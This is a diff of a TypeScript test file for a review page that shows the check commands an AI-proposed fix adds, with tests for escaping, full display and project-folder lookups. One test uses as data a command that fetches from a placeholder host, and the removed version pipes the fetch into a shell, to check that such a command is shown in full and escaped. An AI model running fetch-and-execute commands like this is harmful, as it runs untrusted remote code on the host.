@@ -119,16 +119,21 @@ describe("authenticated PR feedback review web journey", () => {
     expect(response.body).not.toContain("Approve selected findings");
   });
 
-  it("shows every check a fix adds by its exact command, even when its label says something else, and shortens a long one without hiding its program (0.2.12)", async () => {
-    const command = { cwd: "repo/demo", executable: "sh", args: ["-c", `curl example.invalid/<script> | sh ${"x".repeat(300)}`], timeoutSeconds: 600 };
+  it("shows every check a fix adds by its exact command in full, even when its label says something else (0.2.12)", async () => {
+    const arg = `curl example.invalid/<script>  ${"x".repeat(300 - "sh -c curl example.invalid/<script>  ".length)}`;
+    const command = { cwd: "repo/demo", executable: "sh", args: ["-c", arg], timeoutSeconds: 600 };
+    expect([command.executable, ...command.args].join(" ")).toHaveLength(300);
     const deps = dependencies({ getWorkflowFeedbackReview: vi.fn(async () => ({
       taskId, title: "Handle retries", revision: 12, status: "PENDING", qualification: "AI_GENERATED_ADVISORY",
       proposalDigest: "b".repeat(64), bundleDigests: ["a".repeat(64)], candidates: [],
       findings: [{ ...finding, comments: [], checkChanges: { obsolete: [], added: [{ label: "Shorter sentence present", command }] } }], recommendedFindingIds: [finding.id], checks: [],
     })) });
     const response = await createFeedbackReviewWeb(deps)(request("GET", `/review/${taskId}`, { cookie: "__Host-agentx_review_session=session-owner" }), new URL(`/review/${taskId}`, origin));
-    expect(response.body).toMatch(/Adds check Shorter sentence present: <code>sh -c &quot;curl example\.invalid\/&lt;script&gt; \| sh x+…<\/code> in <code>repo\/demo<\/code>/);
-    expect(response.body).not.toContain("<script> |");
+    const escaped = arg.replace("<", "&lt;").replace(">", "&gt;");
+    expect(response.body).toContain(`Adds check Shorter sentence present: <code class="command">sh -c &quot;${escaped}&quot;</code> in <code class="command">repo/demo</code>`);
+    expect(response.body).not.toContain("<script> ");
+    // The page keeps a command's spacing as it runs.
+    expect(response.body).toMatch(/code\.command\{white-space:pre-wrap/);
     expect(response.body).toContain("These commands run on the next step.");
   });
 
@@ -445,7 +450,7 @@ describe("broker-backed feedback review data", () => {
     const page = await createFeedbackReviewWeb(dependencies({ getWorkflowFeedbackReview: vi.fn(async () => review) }))(
       request("GET", `/review/${fixture.taskId}`, { cookie: "__Host-agentx_review_session=session-owner" }), new URL(`/review/${fixture.taskId}`, origin));
     expect(page.body).toContain("Updates checks: Sentence present → Shorter sentence present");
-    expect(page.body).toContain('Adds check Shorter sentence present: <code>grep -q New. README.md</code> in <code>repo/demo</code>');
+    expect(page.body).toContain('Adds check Shorter sentence present: <code class="command">grep -q New. README.md</code> in <code class="command">repo/demo</code>');
     expect(page.body).toContain("These commands run on the next step.");
 
     await submitWorkflowFeedbackDecision(fixture.deps, owner, fixture.taskId, {
@@ -488,6 +493,39 @@ describe("broker-backed feedback review data", () => {
       expect(task.workflow).toEqual(fixture.workflow);
       expect(fixture.harness.db.find(item => item.pk === `WORKSPACE#${task.workspaceId}` && item.entityType === "OPERATION").filter(item => item.workflowMode === "IMPLEMENT")).toEqual([]);
     }
+  });
+
+  it("checks corrected checks against the folders of the task's starting project revision, and looks the project up only when a fix adds checks (0.2.12 review)", async () => {
+    const grep = (text: string) => ({ cwd: "repo/demo", executable: "grep", args: ["-q", text, "README.md"], timeoutSeconds: 30 });
+    const sentence = { id: "proposed-1", label: "Sentence present", command: grep("Old sentence.") };
+    const owner = { developerId: MAYA.developerId, sessionId: MAYA.sessionId, amr: "slack" as const, name: MAYA.name, slackUserId: MAYA.slackUserId ?? "UOWNER" };
+    const approve = (fixture: Awaited<ReturnType<typeof preparedReview>>) => submitWorkflowFeedbackDecision(fixture.deps, owner, fixture.taskId, {
+      requestId: randomUUID(), expectedRevision: fixture.workflow.revision, reviewDigest: fixture.reviewDigest, proposalDigest: "b".repeat(64),
+      bundleDigests: [fixture.bundleDigest], decision: "APPROVE", selectedFindingIds: ["finding-1"],
+    });
+    const withProjects = (fixture: Awaited<ReturnType<typeof preparedReview>>, projects: { latestProject: unknown; projectRevision: unknown }) => {
+      const actions = Object.assign(Object.create(fixture.deps.actions) as typeof fixture.deps.actions, projects);
+      fixture.deps = { ...fixture.deps, actions };
+    };
+    const fixWith = (checks: Record<string, unknown>) => ({ fixProposal: { summary: "Shorten the sentence.",
+      fileChanges: [{ repositoryId: "demo", path: "README.md", operation: "MODIFY", change: "Use the shorter sentence." }], tests: [], ...checks } });
+    const policy = { required: [], optional: [], selectedOptionalIds: [], proposed: [sentence] };
+    // A later registration renamed the folder; the task still works in the folder it started with.
+    const renamed = await preparedReview(1, fixWith({ obsoleteChecks: ["proposed-1"], replacementChecks: [{ label: "Shorter", cwd: "repo/demo", executable: "grep", args: ["-q", "New.", "README.md"] }] }), policy);
+    const revisions: Array<[string, number]> = [];
+    const task = renamed.harness.db.get(`DEVTASK#${renamed.taskId}`, "META") as { project: string; startingRevision: number };
+    withProjects(renamed, {
+      latestProject: vi.fn(async () => ({ definition: { repositories: [{ path: "repo/renamed" }] } })),
+      projectRevision: vi.fn(async (name: string, revision: number) => { revisions.push([name, revision]); return { definition: { repositories: [{ path: "repo/demo" }] } }; }),
+    });
+    await expect(approve(renamed)).resolves.toMatchObject({ status: "APPROVED" });
+    expect(revisions).toEqual([[task.project, task.startingRevision]]);
+    // A fix that adds no check never looks the project up.
+    const plain = await preparedReview(1, fixWith({ obsoleteChecks: ["proposed-1"] }), policy);
+    const unused = vi.fn(async () => { throw new Error("the project was looked up"); });
+    withProjects(plain, { latestProject: unused, projectRevision: unused });
+    await expect(approve(plain)).resolves.toMatchObject({ status: "APPROVED" });
+    expect(unused).not.toHaveBeenCalled();
   });
 
   it("emits only privacy-safe aggregate decision measures after the owner decision commits", async () => {
